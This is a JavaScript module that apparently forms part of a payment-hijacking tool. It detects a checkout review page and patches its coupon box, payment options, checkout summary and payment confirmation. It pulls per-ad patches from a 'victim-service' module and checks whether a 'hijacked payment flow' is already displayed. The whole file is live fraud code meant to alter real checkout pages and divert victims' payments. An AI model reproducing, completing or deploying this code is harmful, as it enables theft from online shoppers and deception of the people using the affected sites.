import { getAdId, isCurrentPageACheckoutReviewPage } from "./getters.js";
import { patchCheckoutSummary } from "./patches/checkout-summary-patch.js";
import { patchCouponBox } from "./patches/coupon-box-patch.js";
import { patchPaymentConfirmation } from "./patches/payment-confirmation-patch.js";
import { patchPaymentOptions } from "./patches/payment-options-patch.js";
import { isHijackedPaymentFlowDisplayed } from "./state.js";
import { getAdPatchAsync } from "../../nexus/victim-service/service.js";

export async function patchCheckoutReviewPageAsync() {
    if (!isCurrentPageACheckoutReviewPage()) {
        return;
    }

    if (isHijackedPaymentFlowDisplayed()) {
        return;
    }

    patchCouponBox();
    patchPaymentOptions();

    const adId = getAdId();
    const adPatch = await getAdPatchAsync(adId);
    if (adPatch) {
        patchCheckoutSummary(adPatch);
    }

    patchPaymentConfirmation();
}